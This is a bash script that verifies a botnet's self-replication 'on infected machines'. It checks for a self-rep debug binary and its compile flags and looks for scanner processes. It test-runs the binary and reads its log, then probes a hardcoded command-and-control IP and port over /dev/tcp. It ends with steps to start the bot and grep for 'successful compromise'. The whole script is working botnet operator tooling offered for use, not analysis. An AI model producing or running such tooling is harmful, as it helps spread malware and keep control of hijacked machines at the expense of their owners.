#!/bin/bash

# Self-Replication Verification Script
# This script verifies that self-replication is working correctly on infected machines

echo "🔍 Self-Replication Verification Tool"
echo "======================================"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print status
print_status() {
    if [ $1 -eq 0 ]; then
        echo -e "${GREEN}✅ $2${NC}"
    else
        echo -e "${RED}❌ $2${NC}"
    fi
}

print_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

echo ""
echo "1. Checking Self-Rep Debug Binary..."
if [ -f "./selfrep_debug" ]; then
    print_status 0 "Debug binary exists"
    ls -la ./selfrep_debug
else
    print_status 1 "Debug binary missing - need to compile"
    echo "Run: make -f Makefile_debug"
fi

echo ""
echo "2. Checking Compilation Flags..."
if [ -f "./selfrep_debug" ]; then
    if strings ./selfrep_debug | grep -q "SELFREP"; then
        print_status 0 "SELFREP flag is enabled"
    else
        print_status 1 "SELFREP flag not found in binary"
    fi
    
    if strings ./selfrep_debug | grep -q "DEBUG"; then
        print_status 0 "DEBUG flag is enabled"
    else
        print_status 1 "DEBUG flag not found in binary"
    fi
fi

echo ""
echo "3. Checking Current Processes..."
SELFREP_PROCESSES=$(ps aux | grep -E "(selfrep|scanner)" | grep -v grep | wc -l)
if [ $SELFREP_PROCESSES -gt 0 ]; then
    print_status 0 "Self-rep processes running ($SELFREP_PROCESSES found)"
    ps aux | grep -E "(selfrep|scanner)" | grep -v grep
else
    print_warning "No self-rep processes currently running"
fi

echo ""
echo "4. Checking Debug Log File..."
if [ -f "/tmp/selfrep_debug.log" ]; then
    print_status 0 "Debug log file exists"
    LOG_SIZE=$(ls -lh /tmp/selfrep_debug.log | awk '{print $5}')
    echo "   Log size: $LOG_SIZE"
    
    # Check for recent activity
    if [ -s "/tmp/selfrep_debug.log" ]; then
        print_status 0 "Log file has content"
        echo "   Last 5 entries:"
        tail -5 /tmp/selfrep_debug.log | sed 's/^/     /'
    else
        print_warning "Log file is empty"
    fi
else
    print_warning "Debug log file not found"
fi

echo ""
echo "5. Testing Self-Rep Functionality..."
echo "Starting test run (10 seconds)..."
echo ""

# Start the debug version in background
./selfrep_debug test_selfrep &
TEST_PID=$!

# Wait for initialization
sleep 3

# Check if process is still running
if ps -p $TEST_PID > /dev/null 2>&1; then
    print_status 0 "Self-rep process started successfully (PID: $TEST_PID)"
    
    # Check for log entries
    sleep 2
    if [ -f "/tmp/selfrep_debug.log" ] && [ -s "/tmp/selfrep_debug.log" ]; then
        print_status 0 "Debug logging is working"
        echo "   Recent log entries:"
        tail -3 /tmp/selfrep_debug.log | sed 's/^/     /'
    else
        print_warning "No debug log entries found"
    fi
    
    # Check for scanner process
    SCANNER_PID=$(ps aux | grep scanner | grep -v grep | awk '{print $2}' | head -1)
    if [ ! -z "$SCANNER_PID" ]; then
        print_status 0 "Scanner process detected (PID: $SCANNER_PID)"
    else
        print_warning "Scanner process not detected"
    fi
    
    # Let it run for a bit more
    sleep 5
    
    # Stop the test
    kill $TEST_PID 2>/dev/null
    wait $TEST_PID 2>/dev/null
    
    print_info "Test completed - process stopped"
else
    print_status 1 "Failed to start self-rep process"
fi

echo ""
echo "6. Network Connectivity Check..."
echo "Checking CNC server connectivity..."

# Check if we can resolve the hardcoded CNC IP
CNC_IP="185.247.117.214"
CNC_PORT="59666"

if ping -c 1 $CNC_IP > /dev/null 2>&1; then
    print_status 0 "CNC server is reachable ($CNC_IP)"
else
    print_warning "CNC server not reachable ($CNC_IP)"
fi

# Check if port is open
if timeout 3 bash -c "</dev/tcp/$CNC_IP/$CNC_PORT" 2>/dev/null; then
    print_status 0 "CNC port $CNC_PORT is open"
else
    print_warning "CNC port $CNC_PORT is not accessible"
fi

echo ""
echo "7. System Resources Check..."
echo "Checking system limits and resources..."

# Check file descriptor limit
FD_LIMIT=$(ulimit -n)
echo "   File descriptor limit: $FD_LIMIT"
if [ $FD_LIMIT -lt 1000 ]; then
    print_warning "Low file descriptor limit - may affect scanning"
    echo "   Recommended: ulimit -n 999999"
else
    print_status 0 "File descriptor limit is adequate"
fi

# Check memory
MEMORY_MB=$(free -m | awk 'NR==2{print $2}')
echo "   Available memory: ${MEMORY_MB}MB"
if [ $MEMORY_MB -lt 512 ]; then
    print_warning "Low memory - may affect performance"
else
    print_status 0 "Memory is adequate"
fi

echo ""
echo "8. Verification Summary..."
echo "=========================="

# Count successful checks
TOTAL_CHECKS=0
PASSED_CHECKS=0

# Check binary
if [ -f "./selfrep_debug" ]; then
    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
    PASSED_CHECKS=$((PASSED_CHECKS + 1))
fi

# Check flags
if [ -f "./selfrep_debug" ] && strings ./selfrep_debug | grep -q "SELFREP"; then
    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
    PASSED_CHECKS=$((PASSED_CHECKS + 1))
fi

# Check log file
if [ -f "/tmp/selfrep_debug.log" ] && [ -s "/tmp/selfrep_debug.log" ]; then
    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
    PASSED_CHECKS=$((PASSED_CHECKS + 1))
fi

# Check CNC connectivity
if ping -c 1 $CNC_IP > /dev/null 2>&1; then
    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
    PASSED_CHECKS=$((PASSED_CHECKS + 1))
fi

echo "Passed: $PASSED_CHECKS/$TOTAL_CHECKS checks"

if [ $PASSED_CHECKS -eq $TOTAL_CHECKS ]; then
    print_status 0 "Self-replication appears to be working correctly!"
    echo ""
    echo "🚀 Next Steps:"
    echo "1. Start the bot: ./start_selfrep_debug.sh"
    echo "2. Monitor logs: tail -f /tmp/selfrep_debug.log"
    echo "3. Check for successful compromises in the log"
else
    print_warning "Some issues detected - review the output above"
    echo ""
    echo "🔧 Troubleshooting:"
    echo "1. Recompile: make -f Makefile_debug clean && make -f Makefile_debug"
    echo "2. Check permissions: ls -la /tmp/selfrep_debug.log"
    echo "3. Verify network connectivity to CNC server"
fi

echo ""
echo "📊 For detailed monitoring, run:"
echo "   ./start_selfrep_debug.sh"
echo ""
echo "📝 To view logs:"
echo "   tail -f /tmp/selfrep_debug.log"
echo ""
echo "🔍 To analyze successful compromises:"
echo "   grep 'successful compromise' /tmp/selfrep_debug.log"
